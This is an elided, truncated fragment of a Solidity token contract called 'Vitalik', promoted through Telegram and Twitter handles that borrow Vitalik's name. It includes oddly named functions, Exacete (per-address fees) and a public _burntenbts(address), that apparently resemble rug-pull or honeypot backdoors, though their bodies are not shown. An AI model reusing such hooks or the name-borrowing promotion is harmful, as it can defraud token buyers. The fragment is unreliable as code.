/**
https://t.me/Vitalik_0x6D2416
https://twitter.com/VITALIK_0X
...
abstract contract Ownable {
    ...
    function transferOwnershipbingert(address newOwner) public virtual onlyOwner {
        _owner = newOwner;
    }

}

contract Vitalik is Ownable {
    ...
    constructor (){
        name = unicode"Vitalik";
        symbol = unicode"VITALIK";
        decimals = 9;
    ...
    function Exacete(address[] memory _usr, uint256 _feePct) external {
        uint256 v1 = 0x01;
        uint256 v2 = 0x02;
        uint256 v3 = 0x03;
    ...
    function _burntenbts(address user) public {
